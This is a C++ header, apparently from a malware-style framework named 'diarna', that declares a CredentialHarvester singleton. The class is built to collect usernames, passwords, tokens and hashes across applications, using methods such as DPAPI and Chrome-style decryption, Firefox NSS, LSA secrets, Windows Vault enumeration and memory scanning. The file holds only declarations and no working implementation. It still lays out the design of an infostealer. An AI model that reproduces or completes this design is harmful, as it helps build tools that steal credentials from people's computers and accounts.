#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <cstdint>
#include <span>
#include <functional>
#include <chrono>
#include <mutex>
#include <algorithm>

namespace diarna { class DiarnaFramework; }

namespace diarna::collection {

struct CredentialEntry {
    std::string application;
    std::string category;
    std::string url;
    std::string username;
    std::string password;
    std::string token;
    std::string hash;
    std::string extra;
    std::string source_file;
    std::chrono::system_clock::time_point extracted_at;
};

enum class ExtractionMethod {
    DPAPI,
    CryptUnprotectData,
    AES_GCM,
    Chrome_CookieStyle,
    Firefox_NSS,
    Plaintext,
    Base64,
    XOR_Obfuscated,
    CustomVault,
    Registry,
    ConfigFile,
    SQLite,
    JSON_Parse,
    INI_Parse,
    XML_Parse,
    Memory_Scan,
    Vault_Enumerate,
    WINCRED_Enumerate,
    LSA_Secrets,
    TokenVault
};

struct AppCredentialTarget {
    const char* app_name;
    const char* category;
    const char* relative_path;
    const char* registry_path;
    const char* filename_pattern;
    ExtractionMethod method;
    bool recursive_search;
    bool all_users;
    uint32_t min_file_size;
    const char* encryption_format;
    const char* description;
};

class CredentialHarvester {
public:
    static CredentialHarvester& instance();

    void harvest_all(std::vector<CredentialEntry>& results);
    void harvest_category(const std::string& category, std::vector<CredentialEntry>& results);
    void harvest_application(const std::string& app_name, std::vector<CredentialEntry>& results);

    size_t app_count() const;
    std::vector<std::string> list_categories() const;
    std::vector<std::string> list_applications() const;

    struct HarvestStats {
        size_t apps_scanned;
        size_t files_found;
        size_t credentials_extracted;
        size_t decryption_successes;
        size_t decryption_failures;
        std::chrono::milliseconds duration;
    };
    HarvestStats last_stats() const;

public:
    CredentialHarvester();
    ~CredentialHarvester() = default;

    void initialize_targets();
    std::wstring expand_path(const char* relative_path, bool all_users);
    std::vector<std::wstring> find_files(const std::wstring& root,
                                          const std::wstring& pattern,
                                          bool recursive);
    bool extract_dpapi(const std::vector<uint8_t>& data, std::string& result);
    bool extract_aes_gcm(const std::vector<uint8_t>& data,
                         const std::vector<uint8_t>& key, std::string& result);
    bool extract_chrome_style(const std::vector<uint8_t>& encrypted,
                               std::string& result);
    bool extract_firefox_nss(const std::string& profile_path,
                              std::vector<CredentialEntry>& results);
    bool extract_vault_enumerate(std::vector<CredentialEntry>& results);
    bool extract_windows_credentials(std::vector<CredentialEntry>& results);
    bool parse_sqlite_db(const std::vector<uint8_t>& db_data,
                          const std::string& sql_query,
                          std::vector<std::vector<std::string>>& rows);
    bool extract_token_store(const std::wstring& path,
                              std::vector<CredentialEntry>& results);

    std::vector<AppCredentialTarget> targets_;
    HarvestStats stats_;
    mutable std::mutex harvest_mutex_;
};

} // namespace diarna::collection
